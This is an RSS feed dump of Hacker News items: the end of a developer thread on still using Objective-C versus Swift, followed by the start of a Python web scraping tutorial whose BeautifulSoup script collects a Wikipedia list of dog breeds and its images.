      <center><a id="up_39443183" href="https://news.ycombinator.com/vote?id=39443183&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I do, but not often.<p>Got my start in Objective-C back in the 2000s tinkering with OS X apps and used it at work for writing iOS apps from 2015-2017, but I embraced Swift pretty quickly (IIRC I started to take it seriously around 2.x).</p><p>It required significant shift in mental models, but having so much more built into the language (needing fewer dependencies is never ever a bad thing, especially when using CocoaPods), less silent breakage, optionals, no awkwardness from having to maintain C compatibility, no need to maintain header files, etc was a big deal for me.</p><p>These days if I’m using it it’s in personal projects to swizzle or access private APIs or in super simple projects that don’t really benefit from Swift’s frills. Aside from that, some projects still have Obj-C dependencies which I’ll need to delve into the source of to debug issues occasionally.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443021"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443021" href="https://news.ycombinator.com/vote?id=39443021&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I have really tried to like Swift, and with new projects I do tend to use it, but legacy projects in Objective-C still make me smile that I get to go back to the old familiar language. I also like its interoperability with C++ through Objective-C++.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39443085"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443085" href="https://news.ycombinator.com/vote?id=39443085&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Compilation speed for an Objective-C project is certainly a pleasant surprise after Swift and Rust.</span></p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="39443364"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443364" href="https://news.ycombinator.com/vote?id=39443364&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I'm comfortable in C, C++, ObjC, and Swift.  I like Swift, but I'm not going to contort myself to use it exclusively.<p>I have some stuff that has zero Swift and likely never will.  Most other things are a mix.</p><p>If I'm writing any ObjC code in a new app today it's probably because either I'm working with some funky low-level API designed for C, my Swift code triggered some kind of compiler bug, or I got pissed off at the way Swift mangles the AppKit or UIKit APIs.  Otherwise, I'm probably using Swift for most other things.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443702"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443702" href="https://news.ycombinator.com/vote?id=39443702&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I’ve been an Apple platforms developer since 2002, though on and off in the past five years or so. So, 22 years of Objective-C and 10 of Swift.<p>I recently got into a client project that has some large swaths of Objective-C code. It’s a joy again, as the compiler is fast and the in-progress writing compile-ahead isn’t always shouting at me.</p><p>It’s really making me nostalgic. That said, I’ve been programming in C a lot lately, so there’s obviously a kinship there.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39444673"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39444673" href="https://news.ycombinator.com/vote?id=39444673&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Sure, still lots of legacy code in my case. I've never really moved to Swift and instead started writing in C# to be able to create cross-platform projects as a solo developer.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39444607"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39444607" href="https://news.ycombinator.com/vote?id=39444607&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>We still default to Objective-C in our SDK. We still support iOS 11, and I don't think we've been bothered enough by Objective-C to check which versions of Swift can be used on the versions of iOS that we support (I last checked a couple of years ago when we supported iOS 8, where the compatibility matrix was a problem for us). However, the examples are in Swift, and we're using Swift wherever the language doesn't matter. iOS's Objective-C support and Objective-C/Swift interoperability is good enough that there aren't business pressures to switch, and the code isn't changing frequently enough that refactoring to Swift would save us in overall time/effort.<p>That being said, we are going to refactor from Google's Closure Compiler to TypeScript on the JS side of the project: surprisingly, we've seen more discomfort with developing with Closure Compiler than we've had complaints with developing with Objective-C.</p><p>Objective-C is a really neat, old language. Initially I was very gungho about switching to Swift, but all of my pain points are with the Apple APIs that we're accessing (and not Objective-C itself). If Objective-C had dot-syntax for calling methods, some more modern typing, and the less verbose Apple APIs, I would have been very happy sticking to Objective-C.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443721"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443721" href="https://news.ycombinator.com/vote?id=39443721&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>The parts of Ardour (ardour.org) that have to interface with several Core* libraries are all written in Objective C(++) and will continue to be so until they can't be. That's not much code, but it's important code. Pretty much all UI stuff - the internal/lower-level stuff uses Apple libs that have C APIs.<p>And note: unbelievably, its 2024 and Apple is able to still fuck up drawing in very recent versions of macOS. How an organization with the history and resources that they have can get such basic stuff wrong is really beyond me.</p><p><a href="https://developer.apple.com/forums/thread/738042" rel="nofollow">https://developer.apple.com/forums/thread/738042</a></p><p>(this appears to be fixed as of 14.3)
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39446409"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39446409" href="https://news.ycombinator.com/vote?id=39446409&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>As someone who works with React in his jobby job, I use Swift and like SwiftUI. Sometimes I need to use UIKit, but not Objective-C.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39442545"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442545" href="https://news.ycombinator.com/vote?id=39442545&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>My company still has some legacy Objective-C code, but most stuff is in Swift (plus SwiftUI) now.<p>Objective-C gets a bad wrap (unfairly, IMO), but it's a neat language, and compilation is <i>so</i> much faster than Swift.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443113"><td></td></tr>
            <tr id="39443843"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443843" href="https://news.ycombinator.com/vote?id=39443843&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I started a large solo project in late 2019 using Swift. I have no trouble compiling and linking the project today. I have been adding Swift code to an old Objective-C project without issues. There was an open source objc project I tried to modify recently, and was told that a feature was so deprecated that using it was no longer an option, forcing me to consider rewriting a large swatch of objc code; it just got so convoluted that I bailed.<p>Early Swift adapters got the arrows in the back. I was not an early adapter.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39444048"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39444048" href="https://news.ycombinator.com/vote?id=39444048&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I've been fortunate (or not fortunate based on certain views here) to be working on a fully Swift app for the past 5 years or so. The upgrades have been painful but we've had a team helping for that process. But I don't see a good reason to write Obj-C unless I work at Apple or a huge legacy codebase anymore.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443958"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443958" href="https://news.ycombinator.com/vote?id=39443958&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I work on an app that's over a decade old, and there's a fair mix of Objective C and Swift.<p>While we tend to add less new Obj C, we don't go out of our way to replace old Obj C with new Swift if the old code is working.  If it makes sense to replace some of the Obj C, we do, and this happens on a case by case basis.</p><p>At the end of the day code is just a tool, and if it's doing its job it's worth a sober look at whether the opportunity cost to replace it is really worth it beyond some perceived notion of newer == better.</p><p>Some things that I really like about Obj C more than Swift:</p><p>easier to explicitly manage memory</p><p>clear separation of declaration and implementation files</p><p>faster to compile</p><p>easier to interop with C</p><p>Resources: Obj C is old, and there's a ton of info out there on how to solve your specific problem
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39444562"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39444562" href="https://news.ycombinator.com/vote?id=39444562&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Yes, because it's easier to mix Objective-C with C and C++ code. Personally I'd lean towards Objective-C regardless because it's a simple and stable language.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39445343"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39445343" href="https://news.ycombinator.com/vote?id=39445343&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I still use objc for all of my apps which are half hobby/business. I don’t have enough time to read the api updates and rewrite my apps every year after a swift language update.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443653"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443653" href="https://news.ycombinator.com/vote?id=39443653&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I used Obj-C professionally for about 2 years and Swift professionally for about 2 years. I have a slight preference for Swift. I've been doing mobile dev on iOS and Android since 2012 and there have been a lot of language changes and programming paradigm shifts. I think it's become more accessible for new devs. For me, I don't think the time and headache to learn the new ways really had a lot of benefit on the end product. Maybe in larger software shops it did.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443316"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443316" href="https://news.ycombinator.com/vote?id=39443316&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>My codebase contains a lot of Objective-C but I'm slowly replacing it with Swift. I rarely write Objective-C (largely because it's so easy to introduce bugs with release/retain shenanigans) unless I really have to. Interoperability between the languages does work but is fragile, with Xcode often getting into a chicken-and-egg state where a compilation error in Swift prevents the Objective-C from compiling, and vice versa, stuffing the interface with errors that can make it hard to discover where the problem is.<p>(edit: typo)
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39445988"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39445988" href="https://news.ycombinator.com/vote?id=39445988&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>…are you maintaining a pre-ARC code base or something? Retain and release shouldn’t be that big of an issue otherwise.</span></p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="39443290"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443290" href="https://news.ycombinator.com/vote?id=39443290&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>As objective-c is a true superset of C, it is a much more effective and ergonomic system language -- interfacing with mach, Posix and Carbon APIs -- than Swift in my experienced opinion.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39444682"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39444682" href="https://news.ycombinator.com/vote?id=39444682&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I agree. I wish the Free Software crowd had adopted it - they sorta did with GNUstep - but unfortunately it doesn't receive the attention it deserves. Anecdotally I've noticed many C and C++ GUI frameworks, like Gtk and Qt, reinvent the dynamism of Objective-C in some way or another (signals/slots, property bindings, etc). The whole GObject system could have been a GNUstep alternative.</span></p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="39442854"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442854" href="https://news.ycombinator.com/vote?id=39442854&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I do my hobby projects in Objective C (and C++). It still does everything I need it to. Have not had a job programming iOS or macOS projects for a long time, so not sure what I'd use there. Maybe the industry has moved on from me. My impression of Swift is that it's fine but doesn't offer much that is worth the effort of learning and mastering it to the point of proficiency. If Apple suddenly deprecated/removed it, I'd probably just stop programming for their ecosystem.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443091"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443091" href="https://news.ycombinator.com/vote?id=39443091&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>Beyond reading old code samples, knowing obj-c provides diminishing returns these days.<p>All relevant obj-c libraries provide an auto-generated native swift interface, and you can even ‘import objc’ if you fancy doing some obj-c runtime stuff – such as swizzling – and still write in Swift.</p><p>I wouldn’t expect to see and/or use it for anything but the most esoteric of use cases these days.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39442487"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442487" href="https://news.ycombinator.com/vote?id=39442487&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>Still have some in work projects, as they're old, but gradually moving on to Swift whatever we can.<p>Though in the FAANG world - Objective C reigns supreme
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39442883"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39442883" href="https://news.ycombinator.com/vote?id=39442883&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Not only objective-c but lots of c++ (useful for cross platform libraries that run on targets besides ios/macos) and that road leads to objective-c++. But at least at Meta many iOS projects use swift now too.</span></p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="39444301"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39444301" href="https://news.ycombinator.com/vote?id=39444301&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I use Obj-C++ so I can mix the two languages ad-hoc. I’ve done it this way since the days of NeXTStep.<p>This allows me to use existing code bases and SDKs, such as the AWS one.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443048"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443048" href="https://news.ycombinator.com/vote?id=39443048&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>For a few very specific use-cases (specifically those involving the objective-c runtime usually), I still use objective-c. Otherwise I’ve moved on to Swift fully and I’m very happy with it. I also use Swift on the server BTW.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39442602"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442602" href="https://news.ycombinator.com/vote?id=39442602&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I learned Objective-C and Cocoa in the days of manual reference counting. I use Swift for new personal projects, I don’t plan to rewrite the old ones in Swift for no reason, but I may add new features in Swift even if not strictly necessary.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39442540"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442540" href="https://news.ycombinator.com/vote?id=39442540&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Still there for me. Kept meaning to spend the boot up time to migrate to Swift but have always been more keen to just get going. Now finally feeling a bit “forced” as I want to tap into Swift only things like widgets and live activities.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443149"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443149" href="https://news.ycombinator.com/vote?id=39443149&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I haven't seen a project started in it in a long time but there's still quite a bit of code floating around. I get the impression it's still used pretty heavily at Apple too.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443369"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443369" href="https://news.ycombinator.com/vote?id=39443369&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I've been writing Objective-C recently to use macOS frameworks from Rust. I can just write C wrapper functions and compile as a static library. Otherwise I use Swift.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39446016"><td></td></tr>
                  <tr id="39442555"><td></td></tr>
                <tr id="39443250"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443250" href="https://news.ycombinator.com/vote?id=39443250&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>SwiftUI is so awful. The poor performance and general clunkiness of the macOS "System Settings" app should be a warning against using it to anyone.</span></p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="39442597"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442597" href="https://news.ycombinator.com/vote?id=39442597&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I just modified some Obj-C code 2 days ago. Part of a RubyMotion app I migrated to Swift. The core was written in Obj-C for performance reasons.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443055"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443055" href="https://news.ycombinator.com/vote?id=39443055&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>How is Swift's interop with C++ nowadays? Obj-C's seamless interop with C++ was (is?) the key advantage.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39443157"><td></td></tr>
                  <tr id="39442554"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442554" href="https://news.ycombinator.com/vote?id=39442554&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>In the literal sense of your question the majority employed by Apple still do due to the mountain that would need to be rewritten</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443281"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443281" href="https://news.ycombinator.com/vote?id=39443281&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I don't, but know many that do. I'll bet almost all AAA apps are still ObjC, and I know that Apple still uses it, in-house, for a lot of their stuff.<p>I write my Apple stuff exclusively in Swift, and don't bridge to C. I have been doing that, since 2014. Before that, I wrote in ObjC.</p><p>I still use UIKit/AppKit/WatchKit for my shipping apps, though. I do not believe that SwiftUI is ready yet, for the scope of my work (I just tried again, this week, and it's still a nope).
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39443632"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443632" href="https://news.ycombinator.com/vote?id=39443632&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>SwiftUI definitely needs more time in the oven, but I’ve found it ok for bite-sized bits of UI where with UIKit boilerplate is as large or larger than the UI code and for screens that aren’t doing anything too interesting (e.g. a typical Settings.app style settings screen).<p>For now though, the bulk of my UIs will continue to be built with code-only (no storyboards/XIBs) UIKit.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39445513"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_39445513" href="https://news.ycombinator.com/vote?id=39445513&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>It makes writing trivial apps incredibly easy. It's just when I need to stray off the beaten path (most of my projects), that I run into issues.<p>I tend to use storyboards, because of some of the fancy auto-layout stuff I do.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                        <tr id="39442906"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442906" href="https://news.ycombinator.com/vote?id=39442906&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Yes very much so. I maintain an established Mac app and it's almost entirely Objective-C (and the bits that aren't are in C and JavaScript)</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39442474"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442474" href="https://news.ycombinator.com/vote?id=39442474&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I use Objective C. And I'm a Web Developer, but I learned it years ago and still use it because Cordova uses it.<p>I make the bridges from Cordova to Swift using Objective C wrappers around functions, but choose to write the actual implementations in Swift. Kind of like I code HTTP handlers as the "controller", and then call from there to PHP classes as a "model".
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39442536"><td></td></tr>
                <tr id="39443025"><td></td></tr>
                <tr id="39443455"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_39443455" href="https://news.ycombinator.com/vote?id=39443455&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Does anyone have an ISO image of WO 4.5? Apple are giving away WO 5 (java only) via a dmg on their website, so I doubt they would mind.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39443511"><td></td></tr>
            <tr id="39443490"><td></td></tr>
                                    </tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Web Scraping in Python – The Complete Guide (330 pts)]]></title>
            <link>https://proxiesapi.com/articles/web-scraping-in-python-the-complete-guide</link>
            <guid>39442273</guid>
            <pubDate>Tue, 20 Feb 2024 15:16:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://proxiesapi.com/articles/web-scraping-in-python-the-complete-guide">https://proxiesapi.com/articles/web-scraping-in-python-the-complete-guide</a>, See on <a href="https://news.ycombinator.com/item?id=39442273">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

      <p><span>I</span>n this tutorial you'll build robust web crawlers using libraries like <a href="https://proxiesapi.com/articles/introduction-to-web-scraping-with-beautifulsoup">BeautifulSoup</a>, learn techniques to overcome real-world scraping challenges and best practices for large scale scraping.</p><p><span>You'll gain the skills to scrape complex sites, handle issues like rate limits, blocks, and javascript pages.</span></p><h2><span><strong>Why Python for Web Scraping?</strong></span></h2><p><span>Python is a popular language for web scraping due to its advantages:</span></p><li><span><strong>Simple Syntax</strong></span><span>: Python's intuitive syntax allows quick coding for scraping.</span></li><li><span><strong>Built-in Libraries</strong></span><span>: Python comes with built-in libraries and modules, like urllib and lxml, that aid in scraping.</span></li><li><span><strong>Mature Scraping Libraries</strong></span><span>: Libraries like Beautiful Soup and Scrapy simplify scraping at any scale.</span></li><li><span><strong>General Purpose</strong></span><span>: Python can be used to build complete data pipelines around scraping.</span></li><li><span><strong>Interoperability</strong></span><span>: Python integrates well with other languages and performs well when performance is crucial.</span></li><p><span>In contrast, languages like C++ require more effort for basic scraping tasks. JavaScript platforms like Node.js can be complex for beginners when building scraping scripts.</span></p><p><span>Python's simplicity, power, and interoperability makes it ideal for scraping needs. Its high-quality libraries allow quick start to scraping at scale.</span></p><h2><span><strong>Best Python Web Scraping Libraries</strong></span></h2><p><span>Some of the most popular and robust Python libraries for web scraping are:</span></p><p><span><strong>BeautifulSoup</strong></span></p><li><span>Features: Excellent HTML/XML parser, easy web scraping interface, flexible navigation and search. We will be using this library in our example scraper below.</span></li><li><span>Use Case: Small to medium scale web scraping.</span></li><li><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/">Link to BeautifulSoup docs</a></li><p><span><strong>Scrapy</strong></span></p><li><span>Features: Fast and scalable, middlewares, distributed crawling capability.</span></li><li><span>Use Case: Large scale advanced web scraping projects.</span></li><li><a href="https://scrapy.org/">Link to Scrapy docs</a></li><p><span><strong>Selenium</strong></span></p><li><span>Features: Full browser automation, handles javascript heavy sites.</span></li><li><span>Use Case: Sites with highly dynamic content loaded by JS.</span></li><li><a href="https://www.selenium.dev/documentation/overview/">Link to Selenium docs</a></li><p><span><strong>lxml</strong></span></p><li><span>Features: Very fast XML and HTML parser.</span></li><li><span>Use Case: Lightning fast parsing of XML/HTML data.</span></li><li><a href="https://lxml.de/">Link to lxml docs</a></li><p><span><strong>pyquery</strong></span></p><li><span>Features: jQuery-style syntax for accessing HTML elements.</span></li><li><span>Use Case: Makes scrape code look cleaner and more readable.</span></li><li><a href="https://pythonhosted.org/pyquery/">Link to pyquery docs</a></li><h2><span><strong>Prerequisites</strong></span></h2><p><span>To follow along with the code examples in this article, you will need:</span></p><p><span><strong>Virtual Environment (Recommended)</strong></span></p><p><span>While optional, we highly recommended creating a virtual env for the project:</span></p><div><pre><code>python -m venv my_web_scraping_env
</code></pre></div><p><span><strong>The Libraries</strong></span></p><p><span>We will be using the </span><span><strong>Requests</strong></span><span>, </span><span><strong>BeautifulSoup</strong></span><span> and </span><span><strong>OS</strong></span><span> libraries primarily:</span></p><div><pre><code>pip install requests beautifulsoup4
</code></pre></div><p><span>This will fetch the libraries from PyPI and install them locally.</span></p><p><span>With the prerequisites installed, you are all setup! Let's start scraping.</span></p><h2><span><strong>Lets pick a target website</strong></span></h2><p><span>For demonstration purposes, we will be scraping the Wikipedia page </span><a href="https://commons.wikimedia.org/wiki/List_of_dog_breeds">List of dog breeds</a><span> to extract information about various dog breeds.</span></p><p><span>The rationale behind choosing this page is:</span></p><li><span>Well structured HTML layout that makes scraping easy</span></li><li><span>Nice table layout with one breed per row</span></li><li><span>Contains mulitple data fields per breed including names, breed group, alternate names and images</span></li><li><span>Images can allow us to showcase scraping binary files as well</span></li><p><span>This is the page we are talking about…</span></p><img src="https://proxiesapi.com/articles/images/65d4bf9ea24a9.jpg" alt=""><p><span>Other great pages to practice web scraping include:</span></p><li><span>Wikipedia category pages like </span><a href="https://en.wikipedia.org/wiki/Lists_of_films">Lists of films</a></li><li><span>Ecommerce product listings like </span><a href="https://www.amazon.com/books-used-books-textbooks/b?ie=UTF8&amp;node=283155">Amazon books</a></li><li><span>Real estate listings like </span><a href="https://www.zillow.com/homes/for_rent/">Zillow rentals</a></li><p><span>The concepts covered will be applicable across any site.</span></p><h2><span><strong>Write the scraping code</strong></span></h2><p><span>Let's now closely examine the full code to understand how to systematically scrape data from the dogs breed webpage.</span></p><div><pre><code>
# Full code

import os
import requests
from bs4 import BeautifulSoup

url = '&lt;https://commons.wikimedia.org/wiki/List_of_dog_breeds&gt;'

# Headers to masquerade as a browser
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

# Download page HTML using requests
response = requests.get(url, headers=headers)

# Check valid response received
if response.status_code == 200:

    # Parse HTML using Beautiful Soup
    soup = BeautifulSoup(response.text, 'html.parser')

    # CSS selector for the main tables
    table = soup.find('table', {'class': 'wikitable sortable'})

    # Initialize data lists to store scraped info
    names = []
    groups = []
    local_names = []
    photographs = []

    # Create directory to store images
    os.makedirs('dog_images', exist_ok=True)

    # Loop through rows omitting header
    for row in table.find_all('tr')[1:]:

        # Extract each column data using CSS selectors
        columns = row.find_all(['td', 'th'])

        name = columns[0].find('a').text.strip()
        group = columns[1].text.strip()

        # Extract local name if exists
        span_tag = columns[2].find('span')
        local_name = span_tag.text.strip() if span_tag else ''

        # Extract photo url if exists
        img_tag = columns[3].find('img')
        photograph = img_tag['src'] if img_tag else ''

        # Download + Save image if url exists
        if photograph:

            response = requests.get(photograph)

            if response.status_code == 200:

                image_filename = os.path.join('dog_images', f'{name}.jpg')

                with open(image_filename, 'wb') as img_file:

                    img_file.write(response.content)

        names.append(name)
        groups.append(group)
        local_names.append(local_name)
        photographs.append(photograph)

print(names)
print(groups)
print(local_names)
print(photographs)
